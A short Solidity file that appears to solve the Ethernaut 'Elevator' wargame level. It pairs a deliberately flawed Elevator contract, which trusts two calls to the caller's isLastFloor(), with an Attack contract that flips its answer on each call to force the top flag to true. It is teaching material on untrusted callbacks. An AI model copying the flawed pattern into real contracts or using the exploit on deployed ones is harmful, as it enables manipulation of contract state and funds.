// SPDX-License-Identifier: MIT

/****Og Contract****/

pragma solidity ^0.6.0;


interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

/****attack Contract****/

contract Attack{
    bool public check = true;
    Elevator instance;
    constructor(address _instance) public{
        instance = Elevator(_instance);
    }

    function attack() public {
        instance.goTo(2);
    }

    function isLastFloor(uint _level) public returns(bool){
        check = !check;
        return check;
    }
}
